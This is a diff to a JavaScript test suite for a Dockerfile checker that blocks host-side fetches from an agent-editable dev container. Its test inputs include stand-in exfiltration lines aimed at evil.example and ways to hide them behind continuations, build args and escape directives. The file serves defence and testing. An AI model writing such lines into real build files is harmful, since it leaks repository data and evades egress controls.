@@ -106,24 +106,38 @@ const DEV = join(DEVDIR, "devcontainer.json");
     // covers RUN only. ADD <url> and the FROM pull happen on the host, from the
     // agent-editable Dockerfile, around the egress proxy.
     const f = (text, args) => checkDockerfile(text, { args });
+    const N = "docker.io/library/node:22-alpine";
     ok("the registries a base image may come from are docker.io and localhost, and nothing else", [...BASE_IMAGE_REGISTRIES].sort().join(",") === "docker.io,localhost");
-    ok("a plain Dockerfile has no host fetches", f("FROM node:22-alpine\nCOPY stamp.txt /stamp.txt\nRUN echo hi\n").length === 0);
-    ok("a fully-qualified docker.io image is fine", f("FROM docker.io/library/node:22-alpine\n").length === 0);
-    ok("a localhost image is fine (a previous build's tag)", f("FROM localhost/caretaker-env-abc:latest\n").length === 0);
-    ok("a stage alias is not a pull", f("FROM node:22 AS build\nFROM build\nFROM scratch\n").length === 0);
-    ok("ADD with a URL is a host fetch", /ADD .* fetches a URL/.test(f("FROM node:22\nADD https://evil.example/x?leak=repo /x\n")[0] ?? ""), JSON.stringify(f("FROM node:22\nADD https://evil.example/x /x\n")));
-    ok("…so is a git URL, and a URL hidden behind --chown", f("FROM node:22\nADD --chown=1:1 git@github.com:a/b.git /x\n").length === 1);
-    ok("…so is a URL behind a line continuation", f("FROM node:22\nADD \\\n  http://evil.example/x \\\n  /x\n").length === 1);
-    ok("ADD of a local path is not", f("FROM node:22\nADD ./dir /x\nADD a.tar.gz b.txt /y/\n").length === 0);
+    ok("a plain Dockerfile with a fully-qualified base has no host fetches", f(`FROM ${N}\nCOPY stamp.txt /stamp.txt\nRUN echo hi\n`).length === 0);
+    ok("a localhost image is fine (a previous build's tag), with or without a port", f("FROM localhost/caretaker-env-abc:latest\nFROM localhost:5000/x\n").length === 0);
+    ok("a stage alias, a stage index and scratch are not pulls", f(`FROM ${N} AS build\nFROM build\nFROM scratch\nCOPY --from=0 /a /b\nCOPY --from=build /a /b\n`).length === 0);
+    // Round 3: an unqualified name is resolved by the HOST's registries.conf, not by docker's rule.
+    ok("an UNQUALIFIED base image is refused, not assumed to be docker.io", /not fully qualified/.test(f("FROM node:22-alpine\n")[0] ?? ""), JSON.stringify(f("FROM node:22-alpine\n")));
+    ok("…and a registry that merely starts with docker.io is not docker.io", /pulls from docker\.io\.evil\.example/.test(f("FROM docker.io.evil.example/x\n")[0] ?? ""));
+    ok("…and a bare host with no slash is unqualified too", f("FROM evil.example\n").length === 1);
+    ok("ADD with a URL is a host fetch", /ADD .* fetches a URL/.test(f(`FROM ${N}\nADD https://evil.example/x?leak=repo /x\n`)[0] ?? ""), JSON.stringify(f(`FROM ${N}\nADD https://evil.example/x /x\n`)));
+    ok("…so is a git URL, and a URL hidden behind --chown or --checksum", f(`FROM ${N}\nADD --chown=1:1 git@github.com:a/b.git /x\nADD --checksum=sha256:00 https://evil.example/y /y\n`).length === 2);
+    ok("…so is a URL behind a line continuation", f(`FROM ${N}\nADD \\\n  http://evil.example/x \\\n  /x\n`).length === 1);
+    ok("…so is the JSON form", f(`FROM ${N}\nADD ["https://evil.example/leak", "/x"]\n`).length === 1, JSON.stringify(f(`FROM ${N}\nADD ["https://evil.example/leak", "/x"]\n`)));
+    ok("…so is a URL that arrives as a ${X:-default}", f(`FROM ${N}\nADD \${X:-https://evil.example/leak} /x\n`).length === 1);
+    ok("ADD of a local path is not", f(`FROM ${N}\nADD ./dir /x\nADD a.tar.gz b.txt /y/\nADD ["a", "b", "/c/"]\n`).length === 0);
+    // Round 3: COPY --from and RUN --mount from= are pulls podman-build(1) lists beside FROM.
+    ok("COPY --from=<image> is a host pull, judged like FROM", /COPY --from= .* pulls from evil\.example/.test(f(`FROM ${N}\nCOPY --from=evil.example/img:leak /a /b\n`)[0] ?? ""), JSON.stringify(f(`FROM ${N}\nCOPY --from=evil.example/img:leak /a /b\n`)));
+    ok("RUN --mount=type=bind,from=<image> is a host pull, judged like FROM", /RUN --mount from= .* pulls from evil\.example/.test(f(`FROM ${N}\nRUN --mount=type=bind,from=evil.example/img:leak,target=/m cat /m/x\n`)[0] ?? ""));
+    ok("…and a cache mount from a stage is not", f(`FROM ${N} AS deps\nFROM ${N}\nRUN --mount=type=cache,from=deps,target=/c true\n`).length === 0);
     ok("FROM another registry is a host fetch, named", /FROM .* pulls from evil\.example/.test(f("FROM evil.example/img:1\n")[0] ?? ""), JSON.stringify(f("FROM evil.example/img:1\n")));
     ok("…including a registry with a port, and ghcr.io", f("FROM evil.example:5000/img\nFROM ghcr.io/a/b\n").length === 2);
-    ok("a FROM through a build arg resolves before it is judged", f("ARG BASE\nFROM ${BASE}\n", { BASE: "node:22" }).length === 0 && f("ARG BASE\nFROM ${BASE}\n", { BASE: "evil.example/x" }).length === 1);
-    ok("…and through an ARG default", f("ARG BASE=node:22\nFROM $BASE\n").length === 0);
+    ok("a FROM through a build arg resolves before it is judged", f("ARG BASE\nFROM ${BASE}\n", { BASE: N }).length === 0 && f("ARG BASE\nFROM ${BASE}\n", { BASE: "evil.example/x" }).length === 1);
+    ok("…and through an ARG default, and a concatenation", f(`ARG BASE=${N}\nFROM $BASE\n`).length === 0 && f("ARG R=evil.example\nARG I=x\nFROM ${R}/${I}\n").length === 1);
     ok("a FROM nothing resolves is refused, not guessed", /cannot be resolved/.test(f("FROM ${BASE}\n")[0] ?? ""));
-    ok("a comment is not an instruction", f("# ADD https://x/y /z\nFROM node:22\n").length === 0);
+    ok("a comment is not an instruction, even inside a continuation", f(`# ADD https://x/y /z\nFROM ${N}\nRUN echo a \\\n# ADD https://evil.example/q /q\n  && echo b\n`).length === 0);
+    ok("an ADD inside a heredoc body is data, not an instruction", f(`FROM ${N}\nRUN <<EOF\nADD https://evil.example/x /x\nEOF\nRUN true\n`).length === 0);
+    ok("…but an ADD after the heredoc ends is judged", f(`FROM ${N}\nRUN <<EOF\necho hi\nEOF\nADD https://evil.example/x /x\n`).length === 1);
+    ok("the escape directive is honoured", f("# escape=`\nFROM " + N + "\nADD `\n  https://evil.example/x `\n  /x\n").length === 1);
+    ok("instruction case does not matter", f(`from ${N}\nadd https://evil.example/x /x\n`).length === 1);
     // Through buildArgv: refused by name before any podman call, only with no build network.
     const DF = join(DEVDIR, "Dockerfile");
-    writeFileSync(DF, "FROM node:22\nADD https://evil.example/x /x\n");
+    writeFileSync(DF, `FROM ${N}\nADD https://evil.example/x /x\n`);
     ok("buildArgv refuses a Dockerfile that would fetch on the host, by name", code(() => buildArgv({ build: { dockerfile: "Dockerfile" } }, DEV, { workspace: PROJ })) === "BUILD_FETCHES");
     ok("…and resolveImage never reaches podman for it", (() => {
       let ran = false;
@@ -131,7 +145,7 @@ const DEV = join(DEVDIR, "devcontainer.json");
       return c === "BUILD_FETCHES" && !ran;
     })());
     ok("a named build network lifts it, and that run is already warned", Array.isArray(buildArgv({ build: { dockerfile: "Dockerfile" } }, DEV, { workspace: PROJ, network: "host" })));
-    writeFileSync(DF, "FROM node:22\nCOPY stamp.txt /stamp.txt\n");
+    writeFileSync(DF, `FROM ${N}\nCOPY stamp.txt /stamp.txt\n`);
     ok("a clean Dockerfile builds with no network", buildArgv({ build: { dockerfile: "Dockerfile" } }, DEV, { workspace: PROJ })[2] === "none");
     rmSync(DF);
   }
